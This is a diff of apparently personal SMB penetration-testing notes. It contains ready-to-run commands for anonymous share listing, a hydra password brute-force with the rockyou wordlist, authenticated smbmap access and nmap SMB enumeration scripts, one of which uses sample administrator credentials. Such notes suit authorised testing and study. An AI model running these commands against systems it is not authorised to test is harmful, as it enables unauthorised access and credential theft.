@@ -74,7 +74,7 @@ $smbclient -L target -N
 
 # Dictionary attack
 
-hydra -l admin -P /usr/share/wordlist/rockyou.txt target smb(protocol)
+hydra -l admin -P /usr/share/wordlist/rockyou.txt target smb
 
 #if discover pass
 smbmap -H target -u admin -p password1
@@ -103,7 +103,7 @@ $nmap -p445 --script smb-protocols target
 
 # information about the SMB security level.
 $nmap -p445 --script smb-security-mode target
-...(but defult usually makes good for hackers)
+...(but defult usually makes good )
 ... acc
 
 # with creds discover sensitive information
@@ -111,7 +111,7 @@ $nmap -p445 --script smb-enum-sessions target
 ...
 
 # In case guest login is not enabled we can always use valid credentials of the target machine to discover the same information
-discover the same information.
+
 $nmap -p445 --script smb-enum-sessions --script-args
 ...smbusername=administrator,smbpassword=smbserver_771 target
 
